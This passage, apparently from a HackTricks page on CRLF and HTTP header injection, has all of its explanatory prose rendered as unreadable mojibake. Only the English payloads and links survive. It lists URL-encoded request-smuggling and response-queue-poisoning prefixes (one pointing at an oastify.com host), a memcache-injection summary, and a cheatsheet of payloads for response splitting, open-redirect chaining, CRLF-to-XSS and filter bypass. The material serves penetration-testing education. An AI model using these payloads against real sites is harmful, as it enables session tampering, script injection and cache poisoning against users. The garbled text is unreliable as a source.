рдЗрд╕рдХреЗ рдмрд╛рдж, рдПрдХ рджреВрд╕рд░рд╛ рдЕрдиреБрд░реЛрдз рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рд╕рд╛рдорд╛рдиреНрдпрдд: [HTTP request smuggling](http-request-smuggling/) рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рдПрдХ рддрдХрдиреАрдХ рдЬрд┐рд╕рдореЗрдВ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреЛрд╕реНрдЯ-рд╕рдВрдЪрдпрди рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝реЗ рдЧрдП рдЕрддрд┐рд░рд┐рдХреНрдд рд╣реЗрдбрд░ рдпрд╛ рдмреЙрдбреА рддрддреНрд╡ рд╕реБрд░рдХреНрд╖рд╛ рдЙрддреНрдкреАрдбрд╝рди рдХреА рд╡рд┐рднрд┐рдиреНрди рд╢рд╛рд╕реНрддреНрд░реЛрдВ рдореЗрдВ рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**рд╢реЛрд╖рдг:**

1. **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдЗрдиреНрдЬреЗрдХреНрд╢рди**: рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ, рдЕрдЧрд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рдпрд╛ рдПрдХ рд╡реЗрдм рдХреИрд╢ рдХреЛ рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ рдЬрд╣рд░реАрд▓рд╛ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрддрд╛рд░ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдкреНрд░реАрдлрд┐рдХреНрд╕ рдмрдирд╛рдирд╛**: рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдПрдХ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдмрдирд╛рдиреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ, рдЬрдм рдЕрдВрддрд┐рдо рдХрдЪрд░реЗ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдкреВрд░реНрдг рджреВрд╕рд░рд╛ рдЕрдиреБрд░реЛрдз рдмрдирд╛рддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрддрд╛рд░ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### рдореЗрдордХреИрд╢ рдЗрдВрдЬреЗрдХреНрд╢рди

рдореЗрдордХреИрд╢ рдПрдХ **рдХреБрдВрдЬреА-рдореВрд▓реНрдп рд╕реНрдЯреЛрд░ рд╣реИ рдЬреЛ рдПрдХ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ**ред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**рдкреВрд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**рдореВрд▓ рд▓реЗрдЦ**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/) **рдкрдврд╝реЗрдВ**

рдпрджрд┐ рдПрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо **рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рд╕реЗ рдбреЗрдЯрд╛ рд▓реЗ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛** рд╣реИ рддрд╛рдХрд┐ **рдореЗрдордХреИрд╢** рд╕рд░реНрд╡рд░ рдХреЛ **рдЕрдиреБрд░реЛрдз** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ **рдирдП рдореЗрдордХреИрд╢ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдореВрд▓ рдЦреЛрдЬреА рдЧрдИ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдореЗрдВ, рдХреИрд╢ рдХреБрдВрдЬреАрдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдИрдкреА рдФрд░ рдкреЛрд░реНрдЯ рд╡рд╛рдкрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдФрд░ рд╣рдорд▓рд╛рд╡рд╛рд░ **рдореЗрдордХреИрд╢ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди** рдХрд░ рд╕рдХрддреЗ рдереЗ рдЬреЛ **рдХреИрд╢ рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╡рд┐рд╡рд░рдг** (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╢рд╛рдорд┐рд▓) рдХреЛ рд╣рдорд▓рд╛рд╡рд╛рд░ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рдереЗ:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ рдпрд╣ рднреА рдЦреЛрдЬрд╛ рдХрд┐ рд╡реЗ рдореЗрдордХреИрд╢ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбрд┐рд╕рд┐рдВрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЖрдИрдкреА рдФрд░ рдкреЛрд░реНрдЯ рднреЗрдЬ рд╕рдХреЗ рдЬрд┐рдирдХреЗ рдИрдореЗрд▓ рдХрд╛ рдЕрдЯреИрдХрд░ рдирд╣реАрдВ рдЬрд╛рдирддрд╛ рдерд╛:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ CRLF / HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреИрд╕реЗ рд░реЛрдХреЗрдВ

CRLF (рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдФрд░ рд▓рд╛рдЗрди рдлреАрдб) рдпрд╛ HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдореЗрдВ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рд╕реЗ рдмрдЪреЗрдВ:** рд╕рдмрд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдпрд╣ рд╣реИ рдХрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдореЗрдВ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░реЗрдВред
2. **рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреЛ рдПрдиреНрдХреЛрдб рдХрд░реЗрдВ:** рдпрджрд┐ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рд╕реЗ рдмрдЪрдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ CR (рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди) рдФрд░ LF (рд▓рд╛рдЗрди рдлреАрдб) рдЬреИрд╕реЗ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреЛ рдПрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЕрднреНрдпрд╛рд╕ CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИред
3. **рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ:** рдЕрдкрдиреА рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЛ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред CR рдФрд░ LF рд╡рд░реНрдгреЛрдВ рдХреЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рднреАрддрд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

### CHEATSHEET

[рдпрд╣рд╛рдВ рд╕реЗ рдЪреАрдЯрд╢реАрдЯ](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
тАв /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
тАв //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
тАв /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
тАв /google.com/%2F..%0D%0AHeader-Test:test2
тАв /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
тАв /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
тАв /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
тАв %E5%98%8A = %0A = \u560a
тАв %E5%98%8D = %0D = \u560d
тАв %E5%98%BE = %3E = \u563e (>)
тАв %E5%98%BC = %3C = \u563c (<)
тАв Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╣рдЪрд╛рди рд╕реВрдЪреА

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## рд╕рдВрджрд░реНрдн

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ** Intigriti, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдЖрдЬ рд╣реА, рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рддрдХ **$100,000** рддрдХ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** HackTricks рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
